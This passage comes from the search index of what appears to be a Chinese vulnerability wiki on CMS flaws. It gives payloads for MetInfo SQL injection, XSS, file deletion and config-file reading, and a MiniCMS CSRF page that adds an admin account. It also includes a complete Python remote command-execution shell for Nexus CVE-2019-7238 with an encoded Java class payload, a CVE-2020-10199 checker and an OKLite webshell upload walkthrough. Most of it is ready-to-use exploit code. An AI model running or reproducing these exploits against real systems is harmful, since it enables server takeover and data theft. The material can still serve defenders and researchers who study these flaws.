\u9875\u9762\u4e2d\uff0c\u7531\u4e8e\u8be5\u9875\u9762\u7684class1\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0: http://172.16.141.134/MetInfo6.1.2/admin/ \uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=29&n=feedback&c=feedback_admin&a=doexport&class1=-1//union//select//concat(0x3a,user(),0x3a)//from/**/information_schema.tables&met_fd_export=-1 \uff0c\u8bbf\u95ee\u540e\u7f51\u7ad9\u4f1a\u5bfc\u51fa\u4e00\u4e2aexcel\u8868\uff0cexcel\u8868\u7684\u540d\u79f0\u4e3a\u6570\u636e\u5e93\u7528\u6237\u540d\u3002 http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn & anyid=29 & n=feedback & c=feedback_admin & a=doexport & class1=-1/**/union/**/select/**/concat(0x3a,user(),0x3a)/**/from/**/information_schema.tables & met_fd_export=-1","title":"Metinfo 6.1.2\u7248\u672c\u5b58\u5728XSS\u6f0f\u6d1e&SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Metinfo-6.1.2\u7248\u672c\u5b58\u5728XSS\u6f0f\u6d1e&SQL\u6ce8\u5165\u6f0f\u6d1e 2018-10-12 \u8e0f\u6708\u7559\u9999 https://www.metinfo.cn/ \u4e0b\u8f7d\u5730\u5740 6.1.2 CVE-2018-18296 / CVE-2018-17129","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"\u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2/admin/index.php\u9875\u9762\uff0c\u7531\u4e8e\u53c2\u6570bigclass\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4XSS\u6f0f\u6d1e \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0: http://172.16.141.134/MetInfo6.1.2/admin/ \uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=25&n=column&c=index&a=doadd&bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e \uff0c\u5373\u53ef\u6267\u884c\u8de8\u7ad9\u811a\u672c\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"XSS\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn & anyid=25 & n=column & c=index & a=doadd & bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e SQL\u6ce8\u5165\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a \u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2 /app/system/feedback/admin/feedback_admin.class.php \u9875\u9762\u4e2d\uff0c\u7531\u4e8e\u8be5\u9875\u9762\u7684class1\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0: http://172.16.141.134/MetInfo6.1.2/admin/ \uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=29&n=feedback&c=feedback_admin&a=doexport&class1=-1//union//select//concat(0x3a,user(),0x3a)//from/**/information_schema.tables&met_fd_export=-1 \uff0c\u8bbf\u95ee\u540e\u7f51\u7ad9\u4f1a\u5bfc\u51fa\u4e00\u4e2aexcel\u8868\uff0cexcel\u8868\u7684\u540d\u79f0\u4e3a\u6570\u636e\u5e93\u7528\u6237\u540d\u3002 http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn & anyid=29 & n=feedback & c=feedback_admin & a=doexport & class1=-1/**/union/**/select/**/concat(0x3a,user(),0x3a)/**/from/**/information_schema.tables & met_fd_export=-1","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"Affected Version \u00b6 Metinfo 6.0.0 POC \u00b6 1 CMS\u5b89\u88c5\u7684\u65f6\u5019\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u540d\u5b57\u4f1a\u88ab\u76f4\u63a5\u5199\u8fdb\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002 \u00b6 2 \u4efb\u610f\u5220\u9664 \u00b6 \u597d\u50cf\u9700\u8981\u767b\u9646\u540e\uff0c\u624d\u80fd\u6267\u884c\u6210\u529f\u3002 admin\u76ee\u5f55\u4e0b\u3002 192.168.0.4/metinfo600/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/test.txt 3 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u00b6 metinfo600/include/thumb.php?dir=http\\..\\..\\config\\config_db.php References \u00b6 Metinfo 6.0.0 \u4f17\u591a\u6f0f\u6d1e\u5206\u6790 MetInfo \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u7684\u4fee\u590d\u4e0e\u7ed5\u8fc7","title":"Methifo6.0.0\u4efb\u610f\u6587\u4ef6\u5220\u9664&\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#affected-version","text":"Metinfo 6.0.0","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#poc","text":"","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#1-cms","text":"","title":"1 CMS\u5b89\u88c5\u7684\u65f6\u5019\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u540d\u5b57\u4f1a\u88ab\u76f4\u63a5\u5199\u8fdb\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#2","text":"\u597d\u50cf\u9700\u8981\u767b\u9646\u540e\uff0c\u624d\u80fd\u6267\u884c\u6210\u529f\u3002 admin\u76ee\u5f55\u4e0b\u3002 192.168.0.4/metinfo600/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/test.txt","title":"2 \u4efb\u610f\u5220\u9664"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#3","text":"metinfo600/include/thumb.php?dir=http\\..\\..\\config\\config_db.php","title":"3  \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#references","text":"Metinfo 6.0.0 \u4f17\u591a\u6f0f\u6d1e\u5206\u6790 MetInfo \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u7684\u4fee\u590d\u4e0e\u7ed5\u8fc7","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-30 zixian\uff08 me@zixian.org \u3001 zixian@5ecurity.cn \uff09 https://github.com/bg5sbk/MiniCMS https://github.com/bg5sbk/MiniCMS 1.10 CVE-2018-9092 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u3002MiniCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a html <html> <head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"> <title>test</title> <body> <form action=\"http://127.0.0.1/minicms/mc-admin/conf.php\" method=\"post\"> <input type=\"hidden\" name=\"site_name\" value=\"hack123\" /> <input type=\"hidden\" name=\"site_desc\" value=\"hacktest\" /> <input type=\"hidden\" name=\"site_link\" value=\"http://127.0.0.1/minicms\" /> <input type=\"hidden\" name=\"user_nick\" value=\"hack\" /> <input type=\"hidden\" name=\"user_name\" value=\"admin\" /> <input type=\"hidden\" name=\"user_pass\" value=\"hackpass\" /> <input type=\"hidden\" name=\"comment_code\" value=\"\" /> <input type=\"hidden\" name=\"save\" value=\" \" /> </form> <script> document.forms[0].submit(); </script> </body> </head> </html>","title":"MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-30 zixian\uff08 me@zixian.org \u3001 zixian@5ecurity.cn \uff09 https://github.com/bg5sbk/MiniCMS https://github.com/bg5sbk/MiniCMS 1.10 CVE-2018-9092","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u3002MiniCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a html <html> <head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"> <title>test</title> <body> <form action=\"http://127.0.0.1/minicms/mc-admin/conf.php\" method=\"post\"> <input type=\"hidden\" name=\"site_name\" value=\"hack123\" /> <input type=\"hidden\" name=\"site_desc\" value=\"hacktest\" /> <input type=\"hidden\" name=\"site_link\" value=\"http://127.0.0.1/minicms\" /> <input type=\"hidden\" name=\"user_nick\" value=\"hack\" /> <input type=\"hidden\" name=\"user_name\" value=\"admin\" /> <input type=\"hidden\" name=\"user_pass\" value=\"hackpass\" /> <input type=\"hidden\" name=\"comment_code\" value=\"\" /> <input type=\"hidden\" name=\"save\" value=\" \" /> </form> <script> document.forms[0].submit(); </script> </body> </head> </html>","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2019-7238_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub # telegram:t.me/zhzyker import requests import sys if len(sys.argv)!=2: print('+-------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ Nexus Repository Manager 3 remote command execution +') print('+-------------------------------------------------------------+') print('+ USE: python3 < filename > < url > +') print('+ EXP: python3 struts2-032_cmd.py http://freeerror.org:8081 +') print('+ VER: Nexus Repository Manager OSS/Pro 3.6.2 -3.14.0 +') print('+-------------------------------------------------------------+') sys.exit() url = sys.argv[1] cmd = \"whoami\" vuln = url + \"/service/extdirect\" headers = { 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\", 'Accept': \"*/*\", 'Content-Type': \"application/json\", 'X-Requested-With': \"XMLHttpRequest\", 'Connection': \"close\", 'Cache-Control': \"no-cache\" } def exp(cmd): payload = \"{\\\"action\\\": \\\"coreui_Component\\\", \\\"type\\\": \\\"rpc\\\", \\\"tid\\\": 8, \\\"data\\\": [{\\\"sort\\\": [{\\\"direction\\\": \\\"ASC\\\", \\\"property\\\": \\\"name\\\"}], \\\"start\\\": 0, \\\"filter\\\": [{\\\"property\\\": \\\"repositoryName\\\", \\\"value\\\": \\\"*\\\"}, {\\\"property\\\": \\\"expression\\\", \\\"value\\\": \\\"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\\\ndefineClass.setAccessible(true);\\\\nx=defineClass.invoke(\\\\ny,\\\\n 'Exploit.Test234',\\\\nz.getBytes('latin1'),0,\\\\n3054\\\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'}\\\\n\\\"}, {\\\"property\\\": \\\"type\\\", \\\"value\\\": \\\"jexl\\\"}], \\\"limit\\\": 50, \\\"page\\\": 1}], \\\"method\\\": \\\"previewAssets\\\"}\" % cmd r =requests.post(vuln, data=payload,headers=headers, verify=False) if r.status_code ==200: print (r.text) else: print (\"[-] Target \"+url+\" Not CVE-2019-7238\") exit() while 1: cmd = input(\"Shell >>> \") if cmd == \"exit\" : exit(0) exp(cmd)","title":"Cve 2019 7238 \u547d\u4ee4\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2020-10199/","text":"#!/usr/bin/python3 # -*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub import sys import requests import json if len(sys.argv)!=5: print('+----------------------------------------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ CVE-2020-10199 need username & password +') print('+----------------------------------------------------------------------------------------------------------+') print('+ USE: python3 < filename > < ip > < port > < csrf > < sessionid > +') print('+ EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb +') print('+ VER: Nexus Repository Manager OSS/Pro version < = 3.21.1 +') print('+----------------------------------------------------------------------------------------------------------+') sys.exit() ip = sys.argv[1] port = sys.argv[2] csrf = sys.argv[3] sessionid = sys.argv[4] url = \"http://\"+ip+\":\"+port headers = { \"Host\": \"%s:%s\" % (ip, port), \"Referer\": url, \"X-Nexus-UI\": \"true\", \"X-Requested-With\": \"XMLHttpRequest\", \"NX-ANTI-CSRF-TOKEN\": csrf, \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0\", \"Accept\": \"application/json, text/plain, */*\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/json\", \"Cookie\": \"NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s\" % (csrf, sessionid), \"Origin\": url, \"Connection\": \"close\" } vulurl=url+\"/service/rest/beta/repositories/go/group\" payload = {\"name\": \"internal\", \"online\": \"true\", \"storage\": {\"blobStoreName\": \"default\", \"strictContentTypeValidation\": \"true\"}, \"group\": {\"memberNames\": [\"$\\\\A{233*233}\"]}} r = requests.post(vulurl, data=json.dumps(payload), headers=headers) print (r.text) if \"A54289\" in r.text: print (\"[+] CVE-2020-10199 vulnerability exists. exp as https://github.com/zhzyker/exphub\") else: print (\"[-] CVE-2020-10199 vulnerability does not exist.\")","title":"Cve 2020 10199"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Ethan\u53d1\u73b0OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09 \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u76f4\u63a5\u4e0a\u4f20getshell \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 OKLite \u7248\u672c \u00b6 OKLite v1.2.25 \u7248\u672c \u7ec4\u4ef6 \u00b6 OKLite \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u53f0\uff0c\u70b9\u51fb\u6a21\u5757\u7ba1\u7406 \u7f16\u8f91\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6test.php,\u538b\u7f29\u4e3atest.zip\u4e0a\u4f20\u3002 \u7136\u540e\u5bfc\u5165\u6a21\u5757 \u70b9\u51fb\u5f00\u59cb\u4e0a\u4f20\uff0c\u4e0a\u4f20shell\u751f\u6210\u5728\u89e3\u538b\u4e3b\u76ee\u5f55\u4e0b\u9762 \u8bbf\u95ee http://127.0.0.1:8888/1.2.25/data/cache/test.php","title":"CVE 2019 16131 OKLite v1.2.25 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","text":"OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","title":"\u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_2","text":"Ethan\u53d1\u73b0OKLite v1.2.25 